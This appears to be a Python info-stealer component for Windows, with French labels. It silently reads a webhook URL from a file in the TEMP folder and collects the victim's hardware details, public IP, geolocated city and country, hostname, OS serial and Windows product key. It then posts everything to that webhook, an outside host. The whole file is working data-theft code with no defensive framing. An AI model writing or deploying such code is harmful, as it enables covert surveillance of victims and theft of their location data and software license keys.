import os
import wmi
import psutil
import requests
import geocoder
import socket
import platform
import time
import subprocess

webhook_path = os.path.join(os.getenv('TEMP'), 'config', 'webhook.txt')

try:
    with open(webhook_path, 'r') as file:
        webhook_url = file.read().strip()
except FileNotFoundError:
    exit()

c = wmi.WMI()

computer_info = c.Win32_ComputerSystem()[0]
os_info = c.Win32_OperatingSystem()[0]
bios_info = c.Win32_BIOS()[0]
processor_info = c.Win32_Processor()[0]
memory_info = c.Win32_PhysicalMemory()[0]
disk_info = c.Win32_DiskDrive()[0]

local_ip = socket.gethostbyname(socket.gethostname())
public_ip = requests.get('https://api.ipify.org').text
location = geocoder.ip(public_ip)
org = location.org if location.org else "Inconnue"

architecture = platform.architecture()[0]
uptime_seconds = time.time() - psutil.boot_time()
uptime = str(time.strftime("%H:%M:%S", time.gmtime(uptime_seconds)))
uefi_mode = os.path.exists(r"C:\Windows\System32\efisys.bin")

hostname = socket.gethostname()
username = os.getlogin()
cpu_count = psutil.cpu_count(logical=True)
uid = os_info.SerialNumber if hasattr(os_info, "SerialNumber") else "Inconnu"
win_key = subprocess.getoutput('powershell -Command "(Get-WmiObject -Query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey"').strip()

embed = {
    "username": "🖥️ **Informations Système**",
    "embeds": [
        {
            "title": "🔍 **Détails Système**",
            "color": 3447003,
            "thumbnail": {
                "url": "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8f/Windows_logo_2021.svg/1200px-Windows_logo_2021.svg.png"
            },
            "footer": {
                "text": "Système mis à jour le : " + time.strftime("%d/%m/%Y %H:%M:%S", time.gmtime(time.time()))
            },
            "fields": [
                {
                    "name": "🌐 **Informations IP**",
                    "value": f"**📍 IP Publique**: {public_ip}\n\n**🌍 Ville**: {location.city or 'Inconnue'}\n**🗺️ Région**: {location.raw.get('region', 'Inconnue')}\n**🌎 Pays**: {location.country or 'Inconnue'}\n**🏢 Organisation**: {org}",
                    "inline": False
                },
                {
                    "name": "🖥️ **Système & Processeur**",
                    "value": f"**🧠 CPU**: {cpu_count} Cores\n\n**💾 Disque**: {round(int(disk_info.Size) / (1024**3))} Go\n**📦 RAM**: {round(int(memory_info.Capacity) / (1024**3))} Go",
                    "inline": False
                },
                {
                    "name": "🔑 **Identifiants Système**",
                    "value": f"**🆔 UID**: {uid}\n\n**🖥️ OS**: {os_info.Caption}\n**🪟 Version Windows**: {os_info.Version}\n**🔑 Clé Windows**: {win_key or 'Inconnue'}",
                    "inline": False
                },
                {
                    "name": "🔒 **Statistiques Système**",
                    "value": f"**💻 Nom d'hôte**: {hostname}\n\n**⏳ Uptime**: {uptime}\n**🔐 Firmware**: {'⚡ UEFI' if uefi_mode else '🖥️ BIOS'}",
                    "inline": False
                }
            ]
        }
    ]
}


requests.post(webhook_url, json=embed)
